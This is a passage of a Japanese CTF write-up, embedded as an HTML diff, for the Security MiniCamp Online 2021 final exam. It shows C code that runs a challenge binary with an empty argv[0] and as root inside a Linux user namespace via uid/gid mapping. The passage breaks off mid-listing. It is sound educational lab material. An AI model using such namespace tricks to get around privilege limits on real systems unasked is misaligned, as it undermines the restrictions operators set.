@@ -1,0 +1,372 @@
+<!doctype html><html lang=ja><head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1">
+<link rel=stylesheet href=/sass/main.min.ebf953826ec39760c462d7fdf952404c734dabd6003b608b954f4693f77d2b3f.css>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css integrity=sha384-KiWOvVjnN8qwAZbuQyWDIbfCLFhLXNETzBQjA/92pIowpC0d2O3nppDGQVgwd2nB crossorigin=anonymous>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js integrity=sha384-0fdwu/T/EQMsQlrHCCHoH10pkPLlKA1jL5dFyUOvB3lfeT2540/2g6YgSi2BL14p crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script defer>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
+<script defer src=/js/prism.min.js></script>
+<link rel=stylesheet href=/css/prism.min.css>
+</head>
+<body>
+<main id=content>
+<p class=category>
+カテゴリー: <a href=/post>post</a>
+</p>
+<article class=suuri><p>::: messages notice<br>
+これは 2021/10/30(土) から 2021/11/20(土) かけて行われたセキュリティ・ミニキャンプ オンライン 2021 の修了試験の writeup です。<br>
+:::</p>
+<p>CTF 形式で、全 5 回の講義にまつわる講義がそれぞれ 1 問ずつ、計 5 問(+フラグ提出確認用の一問)が出題され、これを 9 時くらいから 11:30 までの 2 時間 30 分の間で解きました。</p>
+<p>私は以下を解きました。</p>
+<ul>
+<li>newbie 1 点</li>
+<li>DAY3 Linux システムプログラミング 20 点</li>
+<li>DAY1 ファイルシステム 20 点</li>
+<li>DAY2 サイバー攻撃対応入門 20 点</li>
+</ul>
+<p>このうち newbie はフラグ提出確認用です。</p>
+<p>また、以下の問題が解けませんでした。</p>
+<ul>
+<li>DAY3 コンテナセキュリティ</li>
+<li>DAY2 マルウェアのトラフィックを分析・検知してみよう</li>
+</ul>
+<p>計 3 問+1 問を解いて、表彰上？1 位と 1.5 位につづき同率 2 位でした。(scoreboard 上では 3 位)</p>
+<p>それでは writeup の内容に移ります。</p>
+<h1 id=newbie>newbie</h1>
+<p>フラグが問題文に書いていて、提出してくださいという問題。提出確認用でした。</p>
+<h1 id=day3-linux-システムプログラミング>DAY3 Linux システムプログラミング</h1>
+<p>ssh した先の環境である実行ファイルをある環境のもと実行せよという問題でした。<br>
+具体的には</p>
+<ul>
+<li><code>/try_running_me</code> という実行ファイルを、第 0 引数を <code>"" (empty string)</code> として、root で実行する</li>
+</ul>
+<p>というものでした。</p>
+<h2 id=時間中にやったこと>時間中にやったこと</h2>
+<p>まず <code>ls</code> して出てきた <code>README</code> のメッセージに従って <code>/try_running_me</code> を実行してみます。</p>
+<pre tabindex=0><code>$ /try_running_me
+oops!
+run this binary with setting 0-th argument to &quot;&quot; (empty string)
+</code></pre><p>えっ <code>argv[0]</code> って空文字列に変更できるんですか&mldr;？<code>/proc</code>系をはじめ疑っていたのですが、落ち着いて講義を思い出すとおぼろげながらファイルを実行するときに実行パスを<code>argv</code>に入れた気がしてきました～～～！<br>
+ここで講義の事前課題 2 で書いた C のソースコードを見返すと、こんな感じになっています。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>int</span> <span class=nf>child</span><span class=p>(</span><span class=k>struct</span> <span class=n>child_process</span><span class=o>*</span> <span class=n>p</span><span class=p>){</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>path</span> <span class=o>=</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>binary</span><span class=p>;</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>arg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=n>path</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=nb>NULL</span><span class=p>};</span>
+        <span class=n>dup2</span><span class=p>(</span><span class=n>p</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>STDOUT_FILENO</span><span class=p>);</span>
+        <span class=n>execve</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>arg</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
+        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></div><p>これもしかして</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>char</span><span class=o>*</span> <span class=n>arg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
+</code></pre></div><p>に変更すれば勝てるのでは？SSH 環境下なので C を書いて gcc も入っていたのでコンパイルします。</p>
+<p>ソースコードは以下のようになっています。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define _GNU_SOURCE
+</span><span class=cp>#include</span> <span class=cpf>&lt;sched.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=cp>#define OUTPUT_BUFFER_SIZE 1024
+</span><span class=cp></span>
+<span class=k>struct</span> <span class=n>child_process</span><span class=p>{</span>
+        <span class=kt>void</span><span class=o>*</span> <span class=n>binary</span><span class=p>;</span>
+        <span class=kt>int</span><span class=o>*</span> <span class=n>fd</span><span class=p>;</span>
+<span class=p>};</span>
+
+<span class=kt>int</span> <span class=nf>child</span><span class=p>(</span><span class=k>struct</span> <span class=n>child_process</span><span class=o>*</span> <span class=n>p</span><span class=p>){</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>path</span> <span class=o>=</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>binary</span><span class=p>;</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>arg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=nb>NULL</span><span class=p>};</span>
+        <span class=n>dup2</span><span class=p>(</span><span class=n>p</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>STDOUT_FILENO</span><span class=p>);</span>
+        <span class=n>execve</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>arg</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
+        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>execute_binary</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>binary</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>buffer</span><span class=p>,</span> <span class=k>const</span> <span class=n>size_t</span> <span class=n>bufsize</span><span class=p>)</span> <span class=p>{</span>
+        <span class=kt>int</span> <span class=n>p</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>pipe</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+                <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;pipe failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+                <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=p>}</span>
+        <span class=k>struct</span> <span class=n>child_process</span> <span class=n>process</span><span class=p>;</span>
+        <span class=n>process</span><span class=p>.</span><span class=n>binary</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>binary</span><span class=p>;</span>
+        <span class=n>process</span><span class=p>.</span><span class=n>fd</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>p</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
+        <span class=c1>//puts(&#34;child_process done&#34;);
+</span><span class=c1></span>
+        <span class=kt>void</span><span class=o>*</span> <span class=n>stack</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span><span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span><span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=o>|</span><span class=n>MAP_GROWSDOWN</span><span class=o>|</span><span class=n>MAP_STACK</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
+        <span class=n>pid_t</span> <span class=n>c</span> <span class=o>=</span> <span class=n>clone</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>child</span><span class=p>,</span> <span class=n>stack</span> <span class=o>+</span> <span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span> <span class=n>SIGCHLD</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>process</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+                <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;clone failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+                <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=p>}</span>
+        <span class=n>waitpid</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+        <span class=c1>//puts(&#34;wait done&#34;);
+</span><span class=c1></span>        <span class=n>ssize_t</span> <span class=n>sz</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>process</span><span class=p>.</span><span class=n>fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>bufsize</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>sz</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+                <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;read failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+                <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=p>}</span>
+        <span class=c1>//puts(&#34;sz ok&#34;);
+</span><span class=c1></span>        <span class=k>return</span> <span class=n>sz</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
+        <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>OUTPUT_BUFFER_SIZE</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
+        <span class=kt>int</span> <span class=n>r</span> <span class=o>=</span> <span class=n>execute_binary</span><span class=p>(</span><span class=s>&#34;/try_running_me&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>OUTPUT_BUFFER_SIZE</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+
+        <span class=k>if</span> <span class=p>(</span><span class=n>r</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+                <span class=n>buf</span><span class=p>[</span><span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;read %d bytes</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>r</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
+        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;error %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>r</span><span class=p>);</span>
+        <span class=p>}</span>
+<span class=p>}</span>
+</code></pre></div><p>すると、なにやら違うメッセージが出てきました。</p>
+<pre tabindex=0><code>you're half way there!
+run this binary as root. note that you should keep 0-th argument &quot;&quot;
+</code></pre><p>どうやらこのまま root で実行せよとのことです。 <code>sudo</code> は入っていない環境でした。</p>
+<p>これも講義でやったな！と思い、講義のファイルから必要のないネットワーク部分だけ削除やコメントアウトしてみます。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define _GNU_SOURCE
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sched.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=cp>#define STR_BUF_SIZE 1024
+</span><span class=cp>#define SHELL_PATH &#34;/bin/bash&#34;
+</span><span class=cp></span>
+<span class=kt>int</span> <span class=nf>chroot_dir</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span><span class=k>const</span> <span class=n>path</span><span class=p>)</span> <span class=p>{</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>chroot</span><span class=p>(</span><span class=n>path</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>chdir</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+
+
+<span class=kt>int</span> <span class=nf>exec_command_child</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>cmd</span><span class=p>)</span> <span class=p>{</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=n>SHELL_PATH</span><span class=p>,</span> <span class=s>&#34;-c&#34;</span><span class=p>,</span> <span class=n>cmd</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>envp</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=nb>NULL</span><span class=p>};</span>
+        <span class=n>execve</span><span class=p>(</span><span class=n>SHELL_PATH</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
+        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>exec_command</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>cmd</span><span class=p>)</span> <span class=p>{</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>stack</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span><span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span>
+                                        <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=o>|</span><span class=n>MAP_GROWSDOWN</span><span class=o>|</span><span class=n>MAP_STACK</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>stack</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=n>pid_t</span> <span class=n>child</span> <span class=o>=</span> <span class=n>clone</span><span class=p>((</span><span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>))</span><span class=n>exec_command_child</span><span class=p>,</span> <span class=n>stack</span><span class=o>+</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span> <span class=n>SIGCHLD</span><span class=p>,</span> <span class=n>cmd</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>child</span> <span class=o>==-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>waitpid</span><span class=p>(</span><span class=n>child</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span><span class=o>==-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>parent_install_network</span><span class=p>(</span><span class=n>pid_t</span> <span class=n>child</span><span class=p>)</span> <span class=p>{</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip link add vethA type veth peer vethB&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip link set dev vethA up&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip address add 10.0.0.1/24 dev vethA&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=kt>char</span> <span class=n>cmd</span><span class=p>[</span><span class=n>STR_BUF_SIZE</span><span class=p>];</span>
+        <span class=n>snprintf</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;ip link set dev vethB netns %d&#34;</span><span class=p>,</span> <span class=n>child</span><span class=p>);</span>
+        <span class=n>exec_command</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>child_install_network</span><span class=p>()</span> <span class=p>{</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip link set dev vethB up&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip address add 10.0.0.2/24 dev vethB&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip route add default via 10.0.0.1&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>parent_uninstall_network</span><span class=p>(){</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>exec_command</span><span class=p>(</span><span class=s>&#34;ip link delete vethA&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+
+<span class=p>}</span>
+
+<span class=k>typedef</span> <span class=k>struct</span> <span class=p>{</span>
+        <span class=kt>int</span> <span class=n>fd</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
+<span class=p>}</span> <span class=n>isolated_child_args_t</span><span class=p>;</span>
+
+<span class=kt>int</span> <span class=nf>write_file</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span><span class=k>const</span> <span class=n>path</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=k>const</span> <span class=n>str</span><span class=p>)</span> <span class=p>{</span>
+        <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>O_WRONLY</span><span class=p>);</span>
+        <span class=kt>int</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+        <span class=k>for</span><span class=p>(</span><span class=n>len</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=n>str</span><span class=p>[</span><span class=n>len</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span><span class=n>len</span><span class=o>++</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>str</span><span class=p>,</span> <span class=n>len</span><span class=p>)</span> <span class=o>!=</span> <span class=n>len</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>write_ug_map</span><span class=p>(</span><span class=n>pid_t</span> <span class=n>child</span><span class=p>)</span> <span class=p>{</span>
+        <span class=kt>char</span> <span class=n>path</span><span class=p>[</span><span class=n>STR_BUF_SIZE</span><span class=p>],</span> <span class=n>data</span><span class=p>[</span><span class=n>STR_BUF_SIZE</span><span class=p>];</span>
+        <span class=n>snprintf</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;/proc/%d/setgroups&#34;</span><span class=p>,</span> <span class=n>child</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>write_file</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=s>&#34;deny&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=n>snprintf</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;/proc/%d/gid_map&#34;</span><span class=p>,</span> <span class=n>child</span><span class=p>);</span>
+        <span class=n>snprintf</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;0 %d 1</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>getgid</span><span class=p>());</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>write_file</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=n>snprintf</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;/proc/%d/uid_map&#34;</span><span class=p>,</span> <span class=n>child</span><span class=p>);</span>
+        <span class=n>snprintf</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;0 %d 1</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>getuid</span><span class=p>());</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>write_file</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>isolated_child</span><span class=p>(</span><span class=n>isolated_child_args_t</span><span class=o>*</span> <span class=n>args</span><span class=p>)</span> <span class=p>{</span>
+        <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>args</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=c1>//chroot_dir(&#34;/home/minicamp/sandbox/linux-c/camp/sysroot-debian-bullseye&#34;);
+</span><span class=c1></span>
+<span class=c1>//        child_install_network();
+</span><span class=c1></span>
+
+        <span class=kt>char</span><span class=o>*</span> <span class=n>path</span> <span class=o>=</span> <span class=s>&#34;/try_running_me&#34;</span><span class=p>;</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>arg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
+        <span class=kt>char</span><span class=o>*</span> <span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=nb>NULL</span><span class=p>};</span>
+        <span class=n>execve</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>arg</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
+        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>start_child</span><span class=p>()</span> <span class=p>{</span>
+        <span class=n>isolated_child_args_t</span> <span class=n>args</span><span class=p>;</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>pipe</span><span class=p>(</span><span class=n>args</span><span class=p>.</span><span class=n>fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok: pipe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
